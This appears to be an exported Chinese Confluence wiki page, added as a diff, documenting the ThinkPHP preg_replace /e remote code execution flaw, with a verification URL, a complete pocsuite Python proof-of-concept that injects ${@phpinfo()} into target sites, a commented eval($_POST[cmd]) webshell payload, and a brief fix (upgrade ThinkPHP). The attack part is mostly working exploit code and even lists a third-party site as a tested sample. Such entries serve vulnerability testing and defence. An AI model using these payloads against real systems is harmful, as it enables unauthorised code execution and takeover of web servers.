@@ -1,0 +1,125 @@
+                    
+    
+                    
+    
+                    
+    
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>查看源</title>
+        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
+        <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<!--[if lt IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">
+
+    </head>
+
+    <body class="mceContentBody aui-theme-default wiki-content fullsize">
+        <p>&nbsp;</p>         <p><br /></p><h1><span>一. 漏洞简介</span></h1><p><span><span>漏洞描述：在thinkphp框架<span style="color: rgb(85,85,85);">/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php中存在<span style="color: rgb(85,85,85);">$res = preg_replace('@(w+)'.$depr.'([^'.$depr.'/]+)@e', '$var['/1']=&quot;/2&quot;;', implode($depr,$paths));这样大代码，</span></span></span></span></p><p><span><span><span style="color: rgb(85,85,85);"><span style="color: rgb(85,85,85);"><span style="color: rgb(85,85,85);">这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行</span></span></span></span></span></p><p><span style="color: rgb(26,26,26);"><span>漏洞评级：严重</span></span></p><p><span style="color: rgb(38,38,38);"><span>参考连接：<a href="https://www.kafan.cn/edu/2405521.html">https://www.kafan.cn/edu/2405521.html</a></span></span></p><p><br /></p><h1>二. 利用条件</h1><pre class="prettyprint lang-html prettyprinted">thinkphp版本过低</pre><h1>三. 漏洞验证</h1><p>直接访问<span style="color: rgb(85,85,85);">index.php/module/action/param1/${@print(THINK_VERSION)}该连接，查看页面是否会输出thinkphp的版本号</span></p><h1>四. 漏洞利用</h1><p><br /></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="df0993bb-4554-43db-826d-11503586297c" data-macro-parameters="language=py" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
+#命令行
+from pocsuite import pocsuite_cli
+#验证模块
+from pocsuite import pocsuite_verify
+#攻击模块
+from pocsuite import pocsuite_attack
+#控制台模式
+from pocsuite import pocsuite_console
+from pocsuite.api.request import req 
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
+
+class ThinkphpPOC(POCBase):
+    vulID = '4'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1' #默认为1
+    vulDate = '2017-03-01' #漏洞公开的时间,不知道就写今天
+
+    author = 'ly55521' #  PoC作者的大名
+    createDate = '2017-03-01'# 编写 PoC 的日期
+    updateDate = '2017-03-01'# PoC 更新的时间,默认和编写时间一样
+    references = ['http://0535code.com/']# 漏洞地址来源,0day不用写
+    name = 'Thinkphp Command execution'# PoC 名称
+    appPowerLink = 'http://www.thinkphp.cn/'# 漏洞厂商主页地址
+    appName = 'Thinkphp'# 漏洞应用名称
+    appVersion = 'Thinkphp 0.0-3.1 Lite'# 漏洞影响版本
+    vulType = 'code-exec'#漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        Thinkphp 正则-e模式 代码执行 
+    ''' # 漏洞简要描述
+    samples = ["http://down.51cto.com/data/283085","/examples/Blog/index.php"]# 测试样列,就是用 PoC 测试成功的网站
+    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    cvss = u"严重" #严重,高危,中危,低危
+
+    #验证漏洞 pocsuite -r 4-thinkphp-getshell.py -u 10.1.5.26 --verify
+    def _verify(self):
+        #定义返回结果
+        result = {}
+        #获取漏洞url
+        import urlparse
+        vul_url = urlparse.urlparse(self.url).scheme + "://" + urlparse.urlparse(self.url).netloc
+        send_payload = "/index.php/module/aciton/param1/${@phpinfo()}"
+        url = vul_url + send_payload
+        #print url
+
+        try:
+            r = req.get(url=url, timeout=5,allow_redirects=False) #禁止重定向
+            if r.status_code == 200 and "&lt;title>phpinfo()&lt;/title>" in r.text:
+                #print u"存在漏洞"
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = vul_url
+                result['VerifyInfo']['Payload'] = send_payload
+            else:
+                result = {}
+
+        except Exception,e:
+            #print "error!"
+            result = {}
+
+        return self.save_output(result)
+
+    #漏洞攻击
+    def _attack(self):
+        result = {}
+        # 攻击代码
+        # /index.php/module/action/param1/{${eval($_POST[cmd])}}
+        return self._verify()
+
+    def save_output(self, result):
+        #判断有无结果并输出
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+register(ThinkphpPOC)
+
+
+
+</pre></td></tr></table><p><br /></p><h1>五. 解决方案</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><br /></span></pre><p>升级thinkphp版本</p><pre class="prettyprint lang-html prettyprinted"><br /></pre>
+        <p>&nbsp;</p>
+    </body>
+</html>
